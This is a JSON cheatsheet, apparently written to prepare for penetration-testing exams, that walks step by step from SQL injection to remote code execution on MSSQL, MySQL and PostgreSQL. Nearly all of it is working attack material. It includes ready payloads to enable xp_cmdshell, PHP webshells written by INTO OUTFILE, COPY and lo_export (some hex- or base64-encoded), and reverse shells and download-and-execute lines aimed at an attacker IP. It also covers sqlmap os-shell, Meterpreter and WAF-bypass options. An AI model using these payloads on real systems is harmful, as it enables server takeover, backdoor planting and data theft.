{
  "cheatsheets": [
    {
      "id": "sql-injection-rce",
      "name": "SQL Injection to Remote Code Execution",
      "description": "Comprehensive guide to escalating SQL injection vulnerabilities into remote code execution. Covers MSSQL xp_cmdshell, MySQL INTO OUTFILE webshell, PostgreSQL COPY/lo_export, and sqlmap --os-shell techniques for initial foothold scenarios.",
      "educational_header": {
        "how_to_recognize": [
          "SQL injection confirmed (error-based, UNION-based, or blind SQLi validated)",
          "Database user has elevated privileges (DBA, file write, or command execution rights)",
          "MSSQL target showing xp_cmdshell availability or SA account access",
          "MySQL/MariaDB with FILE privilege (SELECT @@secure_file_priv returns empty or accessible path)",
          "PostgreSQL with SUPERUSER role or pg_read_server_files/pg_write_server_files membership",
          "Web application root path known or discoverable (via error messages, phpinfo, etc.)",
          "Stacked queries supported (semicolons allow multiple statements - MSSQL, PostgreSQL)"
        ],
        "when_to_look_for": [
          "After SQLi enumeration phase confirms database type and privileges",
          "When direct webshell upload not possible (file upload disabled, filtered, or unavailable)",
          "pentest web exploitation requiring initial foothold from SQLi (common scenario)",
          "Post-authentication SQLi where authenticated session provides elevated DB access",
          "During time-limited exam when sqlmap --os-shell provides fastest path to shell",
          "When network layout requires webshell (no direct reverse shell outbound connectivity)",
          "Enterprise environments with MSSQL backend (common in AD labs, always check xp_cmdshell)"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: MSSQL xp_cmdshell - Classic Windows Foothold",
          "context": "Target: Windows Server 2019 running IIS with ASP.NET application. SQL injection confirmed in login form (error-based). Database identified as Microsoft SQL Server 2019. Connection user is 'sa' (sysadmin). Objective: Leverage xp_cmdshell for command execution and establish reverse shell. Access level: Unauthenticated SQLi, high-privilege database user.",
          "approach": "**Phase 1 - Verify MSSQL and Privileges (1-2 min):**\n\n1. Confirm MSSQL version and identify user:\n   - Via error-based: Inject `' UNION SELECT @@version--` in vulnerable parameter\n   - Or via sqlmap: `sqlmap -u 'http://target/login.aspx?user=test' -p user --dbms=mssql --batch`\n   - Look for: `Microsoft SQL Server 2019 (RTM)`\n\n2. Check if current user is sysadmin:\n   - SQLi payload: `' UNION SELECT CONVERT(int, IS_SRVROLEMEMBER('sysadmin'))--`\n   - Returns 1 = sysadmin, 0 = not sysadmin\n   - Or via sqlmap: `sqlmap -u 'URL' -p param --is-dba`\n\n**Phase 2 - Enable and Use xp_cmdshell (2-3 min):**\n\n3. Check if xp_cmdshell already enabled:\n   - `' UNION SELECT 1; EXEC xp_cmdshell 'whoami'--`\n   - If error 'disabled': Proceed to enable it\n   - If works: Skip to Phase 3\n\n4. Enable xp_cmdshell (requires sysadmin):\n   ```\n   ' UNION SELECT 1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--\n   ' UNION SELECT 1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--\n   ```\n   - Must execute both commands (show advanced options first)\n   - No visible output if successful\n\n5. Test command execution:\n   - `' UNION SELECT 1; EXEC xp_cmdshell 'whoami'--`\n   - Expected: `nt service\\mssqlserver` or `nt authority\\system`\n   - If 'nt authority\\system': Already SYSTEM-level access!\n\n**Phase 3 - Establish Reverse Shell (3-5 min):**\n\n6. Set up listener: `nc -nlvp 443` (use common port for firewall bypass)\n\n7. PowerShell reverse shell via xp_cmdshell:\n   ```sql\n   EXEC xp_cmdshell 'powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.5'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"'\n   ```\n\n8. Alternative: Download and execute payload:\n   - Host payload: `python3 -m http.server 80` serving nc.exe or shell.exe\n   - Download: `EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.14.5/nc.exe C:\\Windows\\Temp\\nc.exe'`\n   - Execute: `EXEC xp_cmdshell 'C:\\Windows\\Temp\\nc.exe 10.10.14.5 443 -e cmd.exe'`\n\n**sqlmap Automation (fastest):**\n\n9. `sqlmap -u 'URL' -p param --os-shell --dbms=mssql`\n   - Automatically handles xp_cmdshell enable/disable\n   - Provides interactive shell\n   - Use `os-shell> whoami` to test",
          "commands": [
            "sqlmap-os-shell-mssql",
            "mssql-xpcmdshell-enable",
            "mssql-xpcmdshell-whoami"
          ],
          "expected_outcome": "**Success Timeline (5-10 min):** SQLi confirmation (2 min) -> Privilege check (1 min) -> xp_cmdshell enable (2 min) -> Reverse shell (3-5 min). **Success Indicators:** (1) IS_SRVROLEMEMBER returns 1, (2) xp_cmdshell executes without error, (3) whoami shows service account, (4) Reverse shell connection received. **Common Failures:** (1) 'xp_cmdshell is disabled' -> Enable via sp_configure (must be sysadmin). (2) 'does not have permission' -> User not sysadmin, try impersonation or linked servers. (3) PowerShell blocked -> Try certutil download + nc.exe, or mshta payload. (4) Firewall blocking outbound -> Try common ports (80, 443, 53), or DNS exfiltration. **pentest Note:** xp_cmdshell is HIGH-VALUE target in assessments - always check for MSSQL on Windows targets.",
          "why_this_works": "**xp_cmdshell Mechanics:** xp_cmdshell is an extended stored procedure that spawns Windows command shell and passes command string for execution. Originally designed for legitimate administration but notorious security risk when exposed. Requires sysadmin fixed server role to enable/execute. **Privilege Model:** SQL Server service runs as 'NT SERVICE\\MSSQLSERVER' by default (or configured service account). Commands execute with service account privileges. If SQL Server installed with LocalSystem, xp_cmdshell runs as SYSTEM. **Why Enable Required:** Microsoft disabled xp_cmdshell by default since SQL Server 2005 (security hardening). Must explicitly enable via sp_configure. 'show advanced options' must be enabled first to expose xp_cmdshell option. **relevance:** Extremely common in assessments Windows machines with SQL backends. AD lab scenarios often have SQL Server as stepping stone. Always enumerate MSSQL (port 1433) and check for SQLi in ASP.NET applications."
        },
        {
          "title": "Scenario 2: MySQL INTO OUTFILE Webshell - Linux/Windows Web Foothold",
          "context": "Target: Ubuntu 20.04 running Apache with PHP application. SQL injection confirmed in search parameter (UNION-based). Database identified as MySQL 8.0. Current user has FILE privilege. Web root known: /var/www/html/. Objective: Write PHP webshell via INTO OUTFILE. Access level: Unauthenticated SQLi with FILE privilege.",
          "approach": "**Phase 1 - Verify MySQL and FILE Privilege (1-2 min):**\n\n1. Confirm MySQL and check @@secure_file_priv:\n   - `' UNION SELECT @@version, @@secure_file_priv, 3--`\n   - If secure_file_priv is empty string: Can write anywhere\n   - If secure_file_priv is path: Can only write to that directory\n   - If secure_file_priv is NULL: File operations disabled\n\n2. Verify web root is writable:\n   - Test write: `' UNION SELECT 'test' INTO OUTFILE '/var/www/html/test.txt'--`\n   - Check: `curl http://target/test.txt` - Should show 'test'\n   - If 'Permission denied': Web root not writable by MySQL user, try /tmp or other directories\n\n**Phase 2 - Write PHP Webshell (2-3 min):**\n\n3. Simple PHP webshell via INTO OUTFILE:\n   ```sql\n   ' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--\n   ```\n   - Note: OUTFILE creates NEW file (fails if exists)\n   - Use unique filename to avoid conflicts\n\n4. Alternative with hex encoding (bypass quotes filtering):\n   ```sql\n   ' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e INTO OUTFILE '/var/www/html/shell.php'--\n   ```\n   - Hex decodes to: `<?php system($_GET[\"c\"]); ?>`\n\n5. Test webshell:\n   - `curl 'http://target/shell.php?c=whoami'`\n   - Expected: `www-data` (Apache user)\n\n**Phase 3 - Establish Reverse Shell (2-3 min):**\n\n6. Start listener: `nc -nlvp 4444`\n\n7. Trigger reverse shell via webshell:\n   - URL-encoded bash reverse shell:\n   ```\n   curl 'http://target/shell.php?c=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F4444%200%3E%261%22'\n   ```\n\n8. Or write full PHP reverse shell:\n   ```sql\n   ' UNION SELECT '<?php $sock=fsockopen(\"10.10.14.5\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>' INTO OUTFILE '/var/www/html/rev.php'--\n   ```\n   - Visit http://target/rev.php to trigger\n\n**sqlmap Automation:**\n\n9. `sqlmap -u 'URL' -p param --os-shell --dbms=mysql`\n   - sqlmap automatically attempts file write if FILE privilege detected\n   - Prompts for web root path\n   - Creates tmpXXXXX.php backdoor",
          "commands": [
            "mysql-into-outfile-webshell",
            "sqlmap-file-write",
            "sqlmap-os-shell-mysql"
          ],
          "expected_outcome": "**Success Timeline (5-8 min):** FILE privilege check (1-2 min) -> Webshell write (2-3 min) -> Reverse shell (2-3 min). **Success Indicators:** (1) @@secure_file_priv empty or accessible, (2) Test file appears at web root, (3) Webshell executes commands, (4) Reverse shell received. **Common Failures:** (1) 'secure_file_priv' set to specific directory -> Write shell there, then LFI to include it. (2) 'File exists' error -> OUTFILE creates new files only, use DUMPFILE or unique filename. (3) 'Permission denied on /var/www/html' -> MySQL user lacks write permission, try writable dirs (/tmp, upload folders). (4) AppArmor/SELinux blocking -> Check MySQL profile: `aa-status | grep mysql`. (5) Webshell written but 404 -> Wrong web root, enumerate via phpinfo() or error messages.",
          "why_this_works": "**INTO OUTFILE Mechanics:** MySQL's SELECT INTO OUTFILE writes query results to filesystem. FILE privilege required (global privilege, not per-database). File created with MySQL service account ownership. **secure_file_priv Variable:** Restricts file operations to specific directory. Empty string = no restriction (vulnerable). NULL = disabled entirely. Path = restricted to that directory. Default changed in MySQL 5.7+ to restrict file operations. **Why Webshell Works:** PHP files in web root are served by Apache/Nginx. When accessed via HTTP, web server passes to PHP interpreter. Our injected PHP code executes with web server user privileges (www-data). **Permission Requirements:** MySQL must write to web-accessible directory. Common failures: web root owned by www-data (not mysql), SELinux contexts mismatched. **relevance:** Classic technique but increasingly rare due to secure_file_priv defaults. Still appears in older systems or misconfigured MySQL. Always check secure_file_priv before attempting."
        },
        {
          "title": "Scenario 3: PostgreSQL COPY TO / Large Object RCE - Advanced Technique",
          "context": "Target: Debian 11 running Nginx with Python/Django application. SQL injection confirmed (stacked queries supported). Database identified as PostgreSQL 13. Current user is SUPERUSER. Objective: Achieve RCE via PostgreSQL-specific techniques. Access level: Authenticated SQLi (post-login form), high-privilege database user.",
          "approach": "**Phase 1 - Verify PostgreSQL and Privileges (1-2 min):**\n\n1. Confirm PostgreSQL and superuser status:\n   - `'; SELECT version()--` (stacked query)\n   - Check superuser: `'; SELECT current_setting('is_superuser')--`\n   - Returns 'on' = superuser privileges\n\n2. Verify COPY TO availability:\n   - COPY requires superuser OR pg_write_server_files role (PostgreSQL 11+)\n   - Test: `'; COPY (SELECT 'test') TO '/tmp/test.txt'--`\n\n**Phase 2 - COPY TO Webshell Method (2-3 min):**\n\n3. Write PHP webshell via COPY:\n   ```sql\n   '; COPY (SELECT '<?php system($_GET[\"c\"]); ?>') TO '/var/www/html/shell.php'--\n   ```\n   - Must know exact web root path\n   - Requires write permission to directory\n\n4. Test webshell:\n   - `curl 'http://target/shell.php?c=id'`\n\n**Phase 3 - Large Object Method (Alternative) (3-5 min):**\n\nIf COPY blocked but lo_* functions available:\n\n5. Create large object from command output:\n   ```sql\n   '; SELECT lo_create(1337)--\n   '; INSERT INTO pg_largeobject (loid, pageno, data) VALUES (1337, 0, decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==', 'base64'))--\n   ```\n   - Payload: base64 of `<?php system($_GET[\"c\"]); ?>`\n\n6. Export large object to file:\n   ```sql\n   '; SELECT lo_export(1337, '/var/www/html/shell.php')--\n   ```\n\n7. Cleanup:\n   ```sql\n   '; SELECT lo_unlink(1337)--\n   ```\n\n**Phase 4 - Program Execution via COPY (Linux only) (2-3 min):**\n\n8. Direct command execution via COPY PROGRAM (PostgreSQL 9.3+):\n   ```sql\n   '; COPY shell_table FROM PROGRAM 'id'--\n   ```\n   - Creates table with command output\n   - Or: `'; COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"'--`\n\n**sqlmap Automation:**\n\n9. `sqlmap -u 'URL' -p param --os-shell --dbms=postgresql`\n   - Attempts multiple PostgreSQL RCE techniques\n   - Uses large object method when COPY blocked",
          "commands": [
            "postgresql-copy-webshell",
            "postgresql-lo-export",
            "sqlmap-os-shell-postgresql"
          ],
          "expected_outcome": "**Success Timeline (5-10 min):** Superuser check (1-2 min) -> COPY TO webshell (2-3 min) -> Reverse shell (2-3 min). Large object method adds 2-3 min. **Success Indicators:** (1) is_superuser returns 'on', (2) COPY TO completes without error, (3) Webshell accessible and executes commands. **Common Failures:** (1) 'must be superuser' -> Check pg_write_server_files role membership. (2) COPY blocked but lo_export works -> Use large object method. (3) 'could not open file' -> Permission denied, try /tmp or find writable dir. (4) COPY PROGRAM blocked -> PostgreSQL 9.2 or earlier, or disabled via server config.",
          "why_this_works": "**COPY TO Mechanics:** PostgreSQL COPY command transfers data between table and filesystem. TO writes query results to file. Requires superuser or pg_write_server_files role. File created with postgres service account ownership. **Large Object Method:** PostgreSQL large objects stored in pg_largeobject system table. lo_create() creates object, lo_export() writes to filesystem. Requires superuser. Sometimes available when COPY restricted. **COPY PROGRAM:** PostgreSQL 9.3+ feature for piping to/from shell commands. Extremely powerful - direct command execution without file write. Requires superuser. Often specifically disabled in hardened configurations. **relevance:** PostgreSQL less common than MySQL/MSSQL in assessments but appears in some machines. Understanding multiple methods (COPY, large objects, PROGRAM) shows depth. Django applications commonly use PostgreSQL."
        },
        {
          "title": "Scenario 4: sqlmap --os-shell Automated RCE - Fast Exam Technique",
          "context": "Target: Unknown database backend. SQL injection confirmed via sqlmap enumeration. Time pressure: security assessment, need fastest path to shell. Objective: Use sqlmap's automated OS shell capability. Access level: Unauthenticated SQLi, unknown privilege level.",
          "approach": "**Phase 1 - Basic SQLi Enumeration (2-3 min):**\n\n1. Identify injection point and database:\n   ```bash\n   sqlmap -u 'http://target/page.php?id=1' --batch --banner\n   ```\n   - Identifies: Database type, version, injection type\n   - --batch: Auto-accept defaults (exam time saver)\n\n2. Check database privileges:\n   ```bash\n   sqlmap -u 'URL' -p id --is-dba --batch\n   ```\n   - 'current user is DBA: True' = Can attempt OS shell\n\n**Phase 2 - Attempt --os-shell (3-5 min):**\n\n3. Launch OS shell:\n   ```bash\n   sqlmap -u 'URL' -p id --os-shell --batch\n   ```\n   - sqlmap tries multiple techniques based on database:\n     - MSSQL: xp_cmdshell\n     - MySQL: INTO OUTFILE or UDF\n     - PostgreSQL: COPY or lo_export\n   - May prompt for web root path (provide if known)\n   - May prompt for writable directory\n\n4. If --os-shell fails, try --os-cmd for single commands:\n   ```bash\n   sqlmap -u 'URL' -p id --os-cmd='whoami' --batch\n   ```\n\n**Phase 3 - Upgrade to Reverse Shell (2-3 min):**\n\n5. From sqlmap os-shell prompt:\n   ```\n   os-shell> whoami\n   os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'\n   ```\n   - Or download and execute reverse shell payload\n\n6. Alternative: Use sqlmap's built-in Meterpreter:\n   ```bash\n   sqlmap -u 'URL' -p id --os-pwn --batch\n   ```\n   - Uploads and executes Meterpreter\n   - Requires Metasploit handler running\n\n**Troubleshooting sqlmap --os-shell:**\n\n7. If web application firewall detected:\n   ```bash\n   sqlmap -u 'URL' -p id --os-shell --tamper=space2comment --batch\n   ```\n   - space2comment: Replaces spaces with /**/ (common bypass)\n\n8. If insufficient privileges:\n   ```bash\n   sqlmap -u 'URL' -p id --priv-esc --batch\n   ```\n   - Attempts privilege escalation within database\n\n9. For MSSQL with disabled xp_cmdshell:\n   ```bash\n   sqlmap -u 'URL' -p id --os-shell --dbms=mssql --batch\n   ```\n   - sqlmap automatically enables xp_cmdshell if sysadmin",
          "commands": [
            "sqlmap-os-shell",
            "sqlmap-is-dba",
            "sqlmap-os-cmd"
          ],
          "expected_outcome": "**Success Timeline (5-10 min):** Database identification (2-3 min) -> DBA check (1 min) -> --os-shell attempt (3-5 min) -> Reverse shell upgrade (2-3 min). **Success Indicators:** (1) '--is-dba: True', (2) 'os-shell' prompt appears, (3) Commands execute successfully, (4) Reverse shell received. **Common Failures:** (1) 'not DBA' -> Limited options, try --file-read/--file-write if FILE privilege. (2) 'xp_cmdshell disabled' -> sqlmap auto-enables if sysadmin, else fails. (3) 'web application path' prompt -> Provide correct path or sqlmap brute-forces common paths. (4) WAF blocking -> Use --tamper scripts (space2comment, charencode, etc.). **Exam Tips:** (1) Always try --os-shell first - fastest path if it works. (2) If fails, fall back to manual techniques (scenarios 1-3). (3) Record exact command used for documentation.",
          "why_this_works": "**sqlmap --os-shell Internals:** sqlmap attempts multiple database-specific techniques: MSSQL (xp_cmdshell), MySQL (INTO OUTFILE webshell, UDF injection), PostgreSQL (COPY, large objects). Automatically handles privilege checks, configuration changes (enabling xp_cmdshell), and file operations. **Why --batch Important:** security assessment time pressure requires automation. --batch auto-accepts defaults, avoiding interactive prompts. Can override specific options while keeping batch mode. **UDF Injection (MySQL):** If INTO OUTFILE fails, sqlmap tries User Defined Function injection. Uploads shared library (.so or .dll) to plugin directory, creates function that executes commands. Requires FILE privilege and plugin directory writable. **relevance:** sqlmap --os-shell is pentest-approved (exam allows automated tools). Fastest path from SQLi to shell when it works. Understanding underlying techniques (scenarios 1-3) required when sqlmap fails or for manual exploitation bonus points."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: SQLi Confirmation and Database Identification (2-5 minutes)",
          "notes": "Before attempting RCE, confirm SQLi exists and identify database type. Database identification determines which RCE technique to use. Check privileges early - DBA/superuser required for most techniques.",
          "commands": [
            {
              "id": "sqlmap-fingerprint",
              "example": "sqlmap -u 'http://192.168.45.100/page.php?id=1' --batch --banner --fingerprint",
              "shows": "Database type, version, and banner information"
            },
            {
              "id": "sqlmap-is-dba",
              "example": "sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --is-dba --batch",
              "shows": "current user is DBA: True/False"
            },
            {
              "id": "sqlmap-privileges",
              "example": "sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --privileges --batch",
              "shows": "Database user privilege listing"
            }
          ]
        },
        {
          "title": "Phase 2: MSSQL xp_cmdshell Exploitation (3-5 minutes)",
          "notes": "MSSQL xp_cmdshell is most reliable RCE method when available. Requires sysadmin role. Common in Windows environments with SQL Server backend. sqlmap handles enable/disable automatically.",
          "commands": [
            {
              "id": "sqlmap-os-shell-mssql",
              "example": "sqlmap -u 'http://192.168.45.100/page.aspx?id=1' -p id --os-shell --dbms=mssql --batch",
              "shows": "os-shell> prompt for command execution"
            },
            {
              "id": "mssql-xpcmdshell-enable",
              "example": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--",
              "shows": "Configuration option changed (no error)"
            },
            {
              "id": "mssql-xpcmdshell-reverse-shell",
              "example": "'; EXEC xp_cmdshell 'powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.5/shell.ps1'')\"';--",
              "shows": "Reverse shell connection on attacker listener"
            }
          ]
        },
        {
          "title": "Phase 3: MySQL INTO OUTFILE Webshell (3-5 minutes)",
          "notes": "MySQL webshell requires FILE privilege and @@secure_file_priv empty or accessible. Must know web root path. OUTFILE creates new files only (fails if exists). Consider hex encoding for quote bypass.",
          "commands": [
            {
              "id": "mysql-check-file-priv",
              "example": "' UNION SELECT 1,@@secure_file_priv,3--",
              "shows": "Empty string (vulnerable) or path restriction"
            },
            {
              "id": "mysql-into-outfile-webshell",
              "example": "' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
              "shows": "Query OK (file created in web root)"
            },
            {
              "id": "mysql-hex-webshell",
              "example": "' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e INTO OUTFILE '/var/www/html/s.php'--",
              "shows": "Query OK (hex-encoded PHP shell written)"
            }
          ]
        },
        {
          "title": "Phase 4: PostgreSQL COPY/Large Object RCE (3-5 minutes)",
          "notes": "PostgreSQL offers multiple RCE paths: COPY TO for file write, lo_export for large objects, COPY PROGRAM for direct command execution. All require superuser or equivalent roles.",
          "commands": [
            {
              "id": "postgresql-check-superuser",
              "example": "'; SELECT current_setting('is_superuser');--",
              "shows": "'on' (superuser) or 'off' (limited)"
            },
            {
              "id": "postgresql-copy-webshell",
              "example": "'; COPY (SELECT '<?php system($_GET[\"c\"]); ?>') TO '/var/www/html/shell.php';--",
              "shows": "COPY 1 (file written successfully)"
            },
            {
              "id": "postgresql-copy-program",
              "example": "'; COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"';--",
              "shows": "Reverse shell connection (PostgreSQL 9.3+)"
            }
          ]
        },
        {
          "title": "Phase 5: sqlmap Automated OS Shell (2-5 minutes)",
          "notes": "sqlmap --os-shell attempts database-specific RCE automatically. Fastest method when it works. Falls back to manual techniques if automated methods fail. Use --batch for exam time efficiency.",
          "commands": [
            {
              "id": "sqlmap-os-shell",
              "example": "sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --os-shell --batch",
              "shows": "os-shell> prompt for interactive command execution"
            },
            {
              "id": "sqlmap-os-cmd",
              "example": "sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --os-cmd='whoami' --batch",
              "shows": "Command output: www-data or nt authority\\system"
            },
            {
              "id": "sqlmap-file-write",
              "example": "sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --file-write='./shell.php' --file-dest='/var/www/html/shell.php' --batch",
              "shows": "File written successfully message"
            }
          ]
        }
      ],
      "tags": [
        "sql-injection",
        "rce",
        "web",
        "mssql",
        "mysql",
        "postgresql",
        "xp_cmdshell",
        "webshell",
        "sqlmap",
        "initial-foothold"
      ]
    }
  ]
}